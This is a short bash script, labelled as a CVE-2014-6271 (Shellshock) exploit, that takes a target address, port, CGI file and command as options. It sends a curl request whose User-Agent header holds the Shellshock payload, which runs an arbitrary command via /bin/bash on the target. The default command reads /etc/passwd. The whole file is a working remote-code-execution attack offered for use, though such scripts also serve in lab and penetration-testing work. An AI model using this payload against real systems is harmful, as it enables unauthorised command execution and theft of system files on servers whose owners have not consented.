#!/bin/bash

# CVE-2014-6271 exploit

show_help() {
	echo "shellshock_exp.sh [options]"
	echo ""
	echo "Options:"
	echo "	-h | --help	print this message and exit"
	echo "	-a | --address	target address (default is \"localhost\")"
	echo "	-p | --port	target port (default is 80)"
	echo "	-f | --file	target shell file (default is \"shell.sh\")"
	echo "	-c | --command	command to execute on the target machine (default is \"cat /etc/passwd\")"
}

IP="localhost"
PORT="80"
FILE="shell.sh"
COMMAND="cat /etc/passwd"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
        	show_help
        	exit 0 
        	;;
        -a|--address)
        	IP="$2"
        	shift 2
        	;;
        -p|--port)
        	PORT="$2"
        	shift 2
        	;;
        -f|--file)
        	FILE="$2"
        	shift 2
        	;;
        -c|--command)
        	COMMAND="$2"
        	shift 2
        	;;
    esac
done

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '$COMMAND'" http://$IP:$PORT/cgi-bin/$FILE

exit 0